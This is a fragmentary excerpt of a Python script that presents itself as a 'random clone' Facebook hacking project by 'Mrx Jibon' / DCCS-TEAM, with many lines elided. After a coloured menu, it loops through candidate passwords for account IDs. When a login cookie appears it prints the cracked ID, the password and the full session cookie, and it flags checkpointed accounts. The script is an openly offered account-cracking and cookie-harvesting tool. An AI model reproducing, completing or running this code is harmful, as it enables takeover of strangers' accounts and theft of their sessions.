...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        os.system('espeak -a 200 "Welcome Mrx Jibon Hacker project Random Clone"')
        ...
        print(" [01] RANDOM  NUMBER CLONE \033[1;34m[ULTRA WORKING Tested By Mrx]")
        print(" [02] MY fACEBOOK ACCOUNT  \033[1;35m[ Md Jibon Islam ] ")
        print(" [00] Exit")
        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═DCCS-TEAM═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
        Alif =input(" [?] Choose : ")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Mrx-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Mrx-CP🔪] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[MrxJibon_𝙷4𝙲𝙺𝙴𝚁🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()